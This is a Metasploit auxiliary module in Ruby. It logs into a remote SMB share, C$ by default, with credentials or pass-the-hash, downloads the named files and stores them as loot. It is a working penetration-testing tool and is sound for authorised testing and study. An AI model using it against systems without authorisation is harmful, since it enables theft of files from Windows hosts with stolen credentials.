##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  # Exploit mixins should be called first
  include Msf::Exploit::Remote::SMB::Client
  include Msf::Exploit::Remote::SMB::Client::Authenticated
  include Msf::Exploit::Remote::SMB::Client::RemotePaths
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::OptionalSession::SMB

  def initialize
    super(
      'Name' => 'SMB File Download Utility',
      'Description' => %(
        This module downloads a file from a target share and path. The usual reason
      to use this module is to work around limitations in an existing SMB client that may not
      be able to take advantage of pass-the-hash style authentication.
      ),
      'Author' => [
        'mubix' # copied from hdm upload_file module
      ],
      'License' => MSF_LICENSE,
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [],
        'Reliability' => []
      }
    )

    register_options([
      OptString.new('SMBSHARE', [true, 'The name of a share on the RHOST', 'C$'])
    ])
  end

  def smb_download
    vprint_status('Connecting...')
    if session

      print_status("Using existing session #{session.sid}")
      self.simple = session.simple_client
    else
      connect
      smb_login
    end

    vprint_status("Mounting the remote share \\\\#{simple.address}\\#{datastore['SMBSHARE']}'...")
    simple.connect("\\\\#{simple.address}\\#{datastore['SMBSHARE']}")

    remote_paths.each do |remote_path|
      vprint_status("Trying to download #{remote_path}...")

      data = ''
      fd = simple.open(remote_path.to_s, 'o')
      begin
        data = fd.read
      ensure
        fd.close
      end

      fname = remote_path.split('\\')[-1]
      path = store_loot('smb.shares.file', 'application/octet-stream', rhost, data, fname)
      print_good("#{remote_path} saved as: #{path}")
    rescue Rex::Proto::SMB::Exceptions::ErrorCode => e
      elog("Unable to download #{remote_path}:", error: e)
      print_error("Unable to download #{remote_path}: #{e.message}")
    end
  end

  def run_host(_ip)
    validate_rpaths!

    begin
      smb_download
    rescue Rex::Proto::SMB::Exceptions::LoginError => e
      elog("Unable to login: #{e.message}", error: e)
      print_error("Unable to login: #{e.message}")
    end
  end
end
